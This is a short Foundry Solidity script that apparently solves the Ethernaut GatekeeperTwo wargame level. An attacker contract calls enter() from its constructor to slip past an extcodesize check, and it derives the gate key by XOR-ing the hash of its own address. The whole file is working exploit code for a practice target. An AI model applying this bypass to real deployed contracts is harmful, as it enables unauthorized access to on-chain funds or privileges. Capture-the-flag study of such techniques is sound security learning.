pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";

// deploy on anvil for testing
contract Deploy is Script
{
    function run() external
    {
        vm.startBroadcast();

        GatekeeperTwo gatekeeperTwo = new GatekeeperTwo();

        vm.stopBroadcast();
    }
}

contract Enter is Script
{
    address target; // instance address

    function run() external
    {
        vm.startBroadcast();

        entryPoint entry = new entryPoint(target);

        vm.stopBroadcast();
    }
}

contract entryPoint
{
    constructor(address _target)
    { // enter() is called from the constructor so that
      // this contract's size is 0 at the gateTwo check
        uint64 keyUint = type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 key = bytes8(keyUint);
        GatekeeperTwo(_target).enter(key);
    }
}



